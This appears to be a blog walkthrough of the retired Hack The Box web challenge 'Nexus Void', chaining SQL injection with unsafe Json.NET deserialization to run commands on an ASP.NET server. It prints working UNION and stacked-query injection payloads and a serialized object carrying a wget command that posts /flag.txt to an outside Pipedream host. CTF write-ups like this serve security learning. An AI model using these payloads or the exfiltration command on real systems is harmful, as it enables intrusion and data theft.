---
layout: post
title: "Hack The Box: Nexus Void Walkthrough"
excerpt: "Nexus Void is a retired WEB CTF challenge of medium difficulty on Hack The Box. It is a perfect place to hone your skills in secure code review and SQL injection. I've learned so much more than I originally expected by figuring out the underlying mechanisms."
---
# Initial Analysis
After extracting Source Code and perform a rudimentary analysis on the directory structure and code, one can conclude the following key information:
1. The web application follows [MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller) design pattern and written in `C#` and uses `ASP.NET Core Framework`. Hence, most business logic will be in the `Controller` subdirectory.![1]({{ '/' | relative_url }}public/screenshots/Nexus Void/1.png){:style="display:block; margin-left:auto; margin-right:auto"}
2. The backend database is `sqlite3`.![2]({{ '/' | relative_url }}public/screenshots/Nexus Void/2.png){:style="display:block; margin-left:auto; margin-right:auto"}
3.  Every line of SQL statement that takes user-controlled input is vulnerable to `SQL injection` since they are not parameterized.
4. The flag is located on the server so one needs to find a way to execute code remotely. 
Initially, I thought SQL injection can be leverage [directly](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) to achieve remote code execution, but none of them worked and it turns out to be more complex than that. However, SQL injection is still important and heavily used in the final exploit chain.

# Detailed Analysis
## Command Execution
After further analysis on `HomeController.cs`, one can notice a potentially interesting API endpoint `/status`. The function first instantiates an `StatusCheckHelper` object. It then sets the `command` variable of the object using `statusCheckHelper.command = "[Command]"` to execute a command. Finally, it retrieves the output using `statusCheckHelper.output`.![3]({{ '/' | relative_url }}public/screenshots/Nexus Void/3.png){:style="display:block; margin-left:auto; margin-right:auto"}
- At the point, one may wonder that why setting the `command` variable will execute the command. It all has to do with the concept of [properties](https://www.w3schools.com/cs/cs_properties.php) in `C#`. `properties` exist for the purpose of data hiding and are essentially a hybrid of a variable and a method, and it has two methods: a `get` and a `set` method. Whenever the variable is assigned, the `set` method is automatically called, and similarly, the `get` method triggers only when the variable is accessed. Since we have understand the basic mechanism, let us take a deeper look at `StatusCheckHelper.cs` at the `Helpers` subdirectory.

### StatusCheckHelper 
Within `StatusCheckHelper.cs`, one can identify a property named `command`. The implementation of the `set` method first set the private variable `_command` and execute the command with `System.Diagnostics.Process`.![4]({{ '/' | relative_url }}public/screenshots/Nexus Void/4.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Hijacking
Now that we found a way to execute code but how can we hijack it to execute custom commands? All commands are hard-coded within the `/status` API endpoint. If one looks closer within the `Helpers` subdirectory, `SerializeHelper.cs` indicates that [serialization](https://en.wikipedia.org/wiki/Serialization) is used. Serialization involves converting a data structure or object into a format that can be stored, transmitted, and subsequently reconstructed. This feature can be exactly what we need. By gaining control over the content being deserialized, we could manipulate the `SerializeHelper` to reconstruct a malicious `StatusCheckHelper` object in such a way that it executes a command of our choice.

### Deserialize
The function `Deserialize` base64-decode the input string before reconstructing the object.  One can notice the `JsonSerializerSettings` is set to `TypeNameHandling.All`. The configuration [TypeNameHandling.All](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html#:~:text=In%20fact%20the%20only%20kind%20that%20is%20not%20vulnerable%20is%20the%20default%3A%20TypeNameHandling.None) is dangerous and vulnerable to remote code execution because it enables the creation of arbitrary object as specified in the input.![5]({{ '/' | relative_url }}public/screenshots/Nexus Void/5.png){:style="display:block; margin-left:auto; margin-right:auto"}

### Poison
Identifying the vulnerability in the `Deserialize` function raises two important questions: First, is this function used anywhere within the application? Second, if it is used, do we have control over the input? Fortunately, the answer to both question is positive. We can see that the function `Deserialize` is used is within the API endpoints related to the `wishlist`. 
1. One API endpoint accepts HTTP `POST` requests and two fields: a `name` and a `sellername`. 
	- What the function is doing is less important compared to what can be leveraged. Since both `name` and `sellerName` comes from the frontend and hence controlled by users, we can use `Union-based SQL injection` against `SELECT * from Products WHERE name='{name}' AND sellerName='{sellerName}'`to perform arbitrary database operations.![6]({{ '/' | relative_url }}public/screenshots/Nexus Void/6.png){:style="display:block; margin-left:auto; margin-right:auto"}
2. The other API endpoint handles HTTP GET requests and functions primarily to retrieve a user's `wishlist` from database and uses it to render the frontend display.
	- After exploiting the `POST` API endpoint to perform SQL injection and injecting a malicious payload into `wishlist.data`, the `GET` API endpoint can be used to trigger the deserialization of the payload to achieve remote code execution.![7]({{ '/' | relative_url }}public/screenshots/Nexus Void/7.png){:style="display:block; margin-left:auto; margin-right:auto"}

# Exploitation
In order to access the `wishlist`, one needs to register first. After registration, use `Union-based SQL injection` to retrieve `ID` of the corresponding `wishlist`. Then, again use SQL injection along with the `ID` to update the corresponding `wishlist.data` with the serialized malicious `StatusCheckHelper` object. Finally, by retrieving the `wishlist`, the deserialization will occur, triggering the code execution.

## Set up
I would assume everyone knows how to register and login :>. In the rest of the section, I had a user called `hacker` registered. 

## Exfiltrate ID
After logging in, click on the "Add to Favorites" button at least once. This action is necessary because the `wishlist` in the database will not be created until an item is added for the first time.
- Click one of the `Add to favourites` again and use `Burp Suite`  to capture the request and send it to the `repeater` Module.
- Inject the following payload into `name` field to confirm the number of columns in the `Products` table is 7 since `order by 8` gives `500 Internal Server Error`.
	```
	' order by [Guessed_Column_Number]--
	```
![8]({{ '/' | relative_url }}public/screenshots/Nexus Void/8.png){:style="display:block; margin-left:auto; margin-right:auto"}
![9]({{ '/' | relative_url }}public/screenshots/Nexus Void/9.png){:style="display:block; margin-left:auto; margin-right:auto"}
- Now we know the exact number of columns and table name, we can inject the following payload into `name` field to extract `ID`. The exfiltrated `ID` will be shown when we request for the `wishlist` because, essentially, we added a non-existent product to the `wishlist` with the SQL injection.
	```
	' union select 1, (select group_concat(ID_username) from (select (ID||':'||username) as ID_username from Wishlist)), 3, 4, 5, 6, 7--
	```
![10]({{ '/' | relative_url }}public/screenshots/Nexus Void/10.png){:style="display:block; margin-left:auto; margin-right:auto"}
- The exfiltrated `ID` will be shown when we request for the `wishlist` because, essentially, we added a non-existent product to the `wishlist` with the SQL injection. From the `wishlist`, we can see our `ID` is simply 1.![11]({{ '/' | relative_url }}public/screenshots/Nexus Void/11.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Payload Generation & Delivery
Now that we have the `ID`, we can proceed to update the `wishlist.data`. However, what should our payload look like? In other words, what is the expected output when the `StatusCheckHelper` object is serialized into JSON? Add the following code to `Program.cs` before `app.Run()`.
```C#
using Newtonsoft.Json;
StatusCheckHelper statusCheckHelper = new StatusCheckHelper();
statusCheckHelper.command = "whoami";
string serializedStatusCheckHelper = JsonConvert.SerializeObject(statusCheckHelper, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});

Console.WriteLine(serializedStatusCheckHelper);
```
![12]({{ '/' | relative_url }}public/screenshots/Nexus Void/12.png){:style="display:block; margin-left:auto; margin-right:auto"}
Build the docker image from the provided `Dockerfile` with `docker build -t nexus_void:latest .` and run interactive with `docker run --rm -it -p 80:80/tcp nexus_void:latest`. From the output, we can see that JSON serialized `StatusCheckHelper` object is of the following form:
```
{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":[OUTPUT],"command":"[COMMAND]"}
```
![13]({{ '/' | relative_url }}public/screenshots/Nexus Void/13.png){:style="display:block; margin-left:auto; margin-right:auto"}
With knowledge of the `ID` and payload structure, we can proceed to deliver the payload.
- Since I don't own a server with public IP, I am going to use [Pipedream](https://pipedream.com/) with a workflow that accepts HTTP request to exfiltrate the flag. The actual payload will execute a command that sends an HTTP request to my Pipedream domain, including the flag within the request body.
	```
	{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":null,"command":"wget https://eo6ww37wx07qvmv.m.pipedream.net --post-file /flag.txt"}
	# base64-encoded
	eyIkdHlwZSI6Ik5leHVzX1ZvaWQuSGVscGVycy5TdGF0dXNDaGVja0hlbHBlciwgTmV4dXNfVm9pZCIsIm91dHB1dCI6bnVsbCwiY29tbWFuZCI6IndnZXQgaHR0cHM6Ly9lbzZ3dzM3d3gwN3F2bXYubS5waXBlZHJlYW0ubmV0IC0tcG9zdC1maWxlIC9mbGFnLnR4dCJ9
	```
- Inject the following payload into `name` field to overwrite `wishlist.data`.
	```
	' union select 1 , '', 3, 4, 5, 6, 7) as "n" LIMIT 1; UPDATE Wishlist SET data='eyIkdHlwZSI6Ik5leHVzX1ZvaWQuSGVscGVycy5TdGF0dXNDaGVja0hlbHBlciwgTmV4dXNfVm9pZCIsIm91dHB1dCI6bnVsbCwiY29tbWFuZCI6IndnZXQgaHR0cHM6Ly9lbzZ3dzM3d3gwN3F2bXYubS5waXBlZHJlYW0ubmV0IC0tcG9zdC1maWxlIC9mbGFnLnR4dCJ9' WHERE ID='1';--
	```
	- The reason to include a union select statement `union select 1 , '', 3, 4, 5, 6, 7` before the update statement is to prevent corruption of `wishlist.data` after overwrite. The function will **NOT** corrupt `wishlist.data` only when the product's name is null or empty.![14]({{ '/' | relative_url }}public/screenshots/Nexus Void/14.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- `) as "n" LIMIT 1` is also necessary for the semicolon `;` to enable the execution of multiple SQL commands. The reason behind is explained in depth in the `Beyond Flag` section.

## Pull the Trigger
Now everything is set up. Simply visit the `Home/Wishlist` URL, and the Pipedream workflow will receive an HTTP request containing the flag.![15]({{ '/' | relative_url }}public/screenshots/Nexus Void/15.png){:style="display:block; margin-left:auto; margin-right:auto"}

# Automation
```python3
To be Completed
```

# Beyond Flag
Having a `;` before `--` will render working SQL injection invalid, which is abnormal as `;` is simply a statement terminator. 
![16]({{ '/' | relative_url }}public/screenshots/Nexus Void/16.png){:style="display:block; margin-left:auto; margin-right:auto"}
Hence, I decided to take a deeper look at exactly what SQL statement is executed at the backend. I created a container with previously-built docker image. Here, I will use the `Create` function as example since I failed to get the rest of the application to work in the docker environment. Once I created a user called `hacker`.
![17]({{ '/' | relative_url }}public/screenshots/Nexus Void/17.png){:style="display:block; margin-left:auto; margin-right:auto"}
One can see that, instead of directly executing the SQL query in the Source Code, the framework wraps around another layer.  Then, why it did not cause any problem in the previous injections? The reason is `--` serves as a single line comment. After injection the entire statement is as follows, which is still syntactically correct:
```
SELECT "n"."ID", "n"."password", "n"."username"
FROM (
  SELECT * FROM Users WHERE username='[Injection]'--
) AS "n"
LIMIT 1
```
With the addition of `;`, the final statement will be separated into two statements which are both syntactically incorrect for apparent reasons:
```
SELECT "n"."ID", "n"."password", "n"."username"
FROM (
  SELECT * FROM Users WHERE username='[Injection]';--'
) AS "n"
LIMIT 1
```
![18]({{ '/' | relative_url }}public/screenshots/Nexus Void/18.png){:style="display:block; margin-left:auto; margin-right:auto"}
However, surprisingly,  if we inject `[Injection]') as "n" LIMIT 1;--` to make the first statement syntactically correct. The framework will no longer complain.
```
SELECT "n"."ID", "n"."password", "n"."username"
FROM (
  SELECT * FROM Users WHERE username='[Injection]') as "n" LIMIT 1;--'
) AS "n"
LIMIT 1
```
![19]({{ '/' | relative_url }}public/screenshots/Nexus Void/19.png){:style="display:block; margin-left:auto; margin-right:auto"}

